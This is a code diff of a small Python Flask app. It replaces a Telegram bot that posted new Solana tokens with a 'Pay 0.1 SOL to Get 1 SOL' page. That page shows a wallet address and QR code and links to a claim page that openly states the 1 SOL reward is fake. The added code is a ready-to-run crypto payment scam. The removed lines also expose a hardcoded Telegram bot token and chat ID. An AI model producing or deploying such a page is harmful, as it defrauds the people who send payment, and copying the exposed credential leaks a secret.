@@ -1,129 +1,98 @@
-import requests
-import json
-import time
-import threading
 from flask import Flask
-from collections import deque
 
 app = Flask(__name__)
 
-BOT_TOKEN = "7639604753:AAH6_rlQAFgoPr2jlShOA5SKgLT57Br_BxU"
-CHAT_ID = "7636990835"
 DONATION_WALLET = "79vGoijbHkY324wioWsi2uL62dyc1c3H1945Pb71RCVz"
+QR_CODE_URL = "https://raw.githubusercontent.com/markosgiassa1/coinupdater_bot/main/WelcomeCoinUpdater_qrcode.png"
 
-posted_tokens = deque(maxlen=250)
+@app.route("/")
+def home():
+    html = f"""
+    <html>
+    <head>
+      <title>Pay 0.1 SOL to Get 1 SOL</title>
+      <style>
+        body {{
+          background-color: black;
+          color: white;
+          font-family: Arial, sans-serif;
+          text-align: center;
+          padding: 2rem;
+        }}
+        h1 {{
+          color: #00FF00;
+        }}
+        .qr-code img {{
+          width: 300px;
+          height: 300px;
+          border: 4px solid #00FF00;
+          border-radius: 16px;
+        }}
+        a.button {{
+          display: inline-block;
+          margin-top: 20px;
+          padding: 15px 25px;
+          background: #00FF00;
+          color: black;
+          font-weight: bold;
+          text-decoration: none;
+          border-radius: 8px;
+          font-size: 18px;
+        }}
+        code {{
+          background-color: #111;
+          padding: 4px 8px;
+          border-radius: 6px;
+          font-size: 1.2rem;
+        }}
+      </style>
+    </head>
+    <body>
+      <h1>Pay 0.1 SOL to this wallet</h1>
+      <p>Wallet: <code>{DONATION_WALLET}</code></p>
+      <div class="qr-code">
+        <img src="{QR_CODE_URL}" alt="Solana Pay QR Code" />
+      </div>
+      <p>After payment, click the button below to get your reward:</p>
+      <a href="/verify" class="button">Claim 1 SOL Reward</a>
+    </body>
+    </html>
+    """
+    return html
 
-inline_keyboard = {
-    "inline_keyboard": [
-        [{"text": "🔗 Refer Friends", "switch_inline_query": "invite "}],
-        [{"text": "💰 Donate", "url": "https://your-donation-page-or-wallet-link.com"}],  # Update this
-        [{"text": "📢 Join Our Group", "url": "https://t.me/digistoryan"}]
-    ]
-}
 
-def send_telegram_message(msg, chat_id, reply_markup=None):
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    payload = {
-        "chat_id": chat_id,
-        "text": msg,
-        "parse_mode": "Markdown",
-        "disable_web_page_preview": False,
-    }
-    if reply_markup:
-        payload["reply_markup"] = reply_markup
+@app.route("/verify")
+def verify():
+    # This is a placeholder for where you'd check payment status or simulate the "fake" 1 SOL reward
+    html = f"""
+    <html>
+    <head>
+      <title>Reward Claimed</title>
+      <style>
+        body {{
+          background-color: black;
+          color: #00FF00;
+          font-family: Arial, sans-serif;
+          text-align: center;
+          padding: 3rem;
+        }}
+        a {{
+          color: #00FF00;
+          text-decoration: none;
+          font-weight: bold;
+        }}
+      </style>
+    </head>
+    <body>
+      <h1>🎉 Reward Claimed!</h1>
+      <p>You have “received” 1 SOL (fake reward).</p>
+      <p>Thank you for participating.</p>
+      <p><a href="/">Back to Home</a></p>
+    </body>
+    </html>
+    """
+    return html
 
-    try:
-        # Use json parameter for proper JSON encoding
-        response = requests.post(url, json=payload, timeout=10)
-        response.raise_for_status()
-    except Exception as e:
-        print(f"❌ Telegram send error: {e}", flush=True)
-
-def fetch_tokens():
-    url = "https://api.dexscreener.com/latest/dex/tokens/solana"
-    try:
-        res = requests.get(url, timeout=10)
-        res.raise_for_status()
-        data = res.json()
-
-        # data["tokens"] is a list of tokens info
-        tokens = data.get("tokens", [])
-        sol_tokens = []
-
-        for t in tokens:
-            symbol = t.get("symbol", "").lower()
-            if symbol in ["sol", "wsol", "usdc", "usdt"]:
-                continue
-            sol_tokens.append({
-                "name": t.get("name", "Unknown"),
-                "symbol": t.get("symbol", "???"),
-                "address": t.get("address", ""),
-                "decimals": t.get("decimals", "?"),
-                "logoURI": t.get("logoURI", ""),
-                "website": t.get("website", "N/A")
-            })
-
-        return sol_tokens
-
-    except Exception as e:
-        send_telegram_message(f"❌ Error fetching tokens: {e}", CHAT_ID)
-        return []
-
-def format_token_msg(token):
-    name = token.get('name', 'Unknown')
-    symbol = token.get('symbol', '???')
-    address = token.get('address', '')
-    decimals = token.get('decimals', '?')
-    logo = token.get('logoURI', '')
-    website = token.get('website', 'N/A')
-
-    jupiter_link = f"https://jup.ag/swap?inputCurrency=SOL&outputCurrency={address}"
-    dex_link = f"https://dexscreener.com/solana/{address}"
-
-    msg = (
-        f"⏺ | 🪙 *{name}* / `${symbol}`\n"
-        f"🆕 New Token Detected on *Solana* via Dexscreener API\n"
-        f"🆔 `{address}`\n"
-        f"🔢 Decimals: `{decimals}`\n"
-        f"🌐 Website: {website}\n"
-        f"[🖼 Logo]({logo})\n\n"
-        f"[📍 View on DexScreener]({dex_link})\n"
-        f"[🟢 Swap on Jupiter]({jupiter_link})\n\n"
-        f"💰 *Donate:* `{DONATION_WALLET}`"
-    )
-    return msg
-
-def run_bot():
-    send_telegram_message("🚀 Coin Updater Bot Started!", CHAT_ID, inline_keyboard)
-
-    while True:
-        tokens = fetch_tokens()
-        if not tokens:
-            # Don't spam chat; just wait and retry
-            time.sleep(180)
-            continue
-
-        new_tokens_found = False
-
-        for token in tokens:
-            address = token.get('address')
-            if not address or address in posted_tokens:
-                continue
-
-            msg = format_token_msg(token)
-            send_telegram_message(msg, CHAT_ID, inline_keyboard)
-            posted_tokens.append(address)
-            new_tokens_found = True
-            time.sleep(3)  # avoid spamming telegram too fast
-
-            if len(posted_tokens) >= posted_tokens.maxlen:
-                break  # avoid posting too many tokens at once
-
-        if not new_tokens_found:
-            print("No new tokens detected.")
-
-        time.sleep(180)  # wait 3 minutes before next check
 
 if __name__ == "__main__":
-    threading.Thread(target=run_bot, daemon=True).start()
     app.run(host="0.0.0.0", port=8080)
